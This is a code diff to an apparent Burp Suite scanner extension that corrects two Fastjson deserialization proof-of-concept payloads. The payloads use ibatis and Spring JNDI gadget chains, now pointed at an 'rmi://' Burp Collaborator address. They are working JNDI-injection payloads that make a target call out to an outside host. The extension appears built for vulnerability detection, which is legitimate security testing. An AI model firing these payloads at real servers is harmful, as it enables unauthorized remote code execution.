@@ -184,7 +184,7 @@ public class FastJson {
         IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
         String val = collaboratorClientContext.generatePayload(true);
         // 据说可以覆盖所有版本
-        String poc = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":"+ val +"}}";
+        String poc = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://"+ val +"\"}}";
 
         // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
         // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
@@ -217,7 +217,7 @@ public class FastJson {
         IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
         String val = collaboratorClientContext.generatePayload(true);
         // 据说可以覆盖所有版本
-        String poc = "Set [{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":["+val+"]},\"adviceBeanName\":"+ val +"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]";
+        String poc = "Set [{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"rmi://"+val+"\"]},\"adviceBeanName\":\"rmi://"+ val +"\"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]";
 
         // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
         // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
